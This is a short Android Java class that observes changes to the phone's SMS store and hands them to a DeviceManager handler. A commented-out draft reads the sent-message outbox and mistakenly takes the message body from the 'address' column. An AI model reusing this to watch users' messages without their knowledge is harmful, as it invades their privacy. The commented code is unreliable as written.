package com.internetruntime.androidclient.DeviceManager;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.os.Handler;

public class SMSObserver extends ContentObserver {

	private DeviceManager dm = null;
	private ContentResolver cr = null;
	
	public SMSObserver(Handler handler, DeviceManager dm, ContentResolver cr) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.dm = dm;
		this.cr = cr;
	}

	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		dm.SMSSndHandler(this.cr);
		// Cursor cursor =
		// getContentResolver().query(Uri.parse("content://sms/outbox"), null,
		// null, null, null);
		// if (cursor.moveToFirst())
		// {
		// String receriver =
		// cursor.getString(cursor.getColumnIndex("address"));
		// String body = cursor.getString(cursor.getColumnIndex("address"));
		//
		// }
	}

}
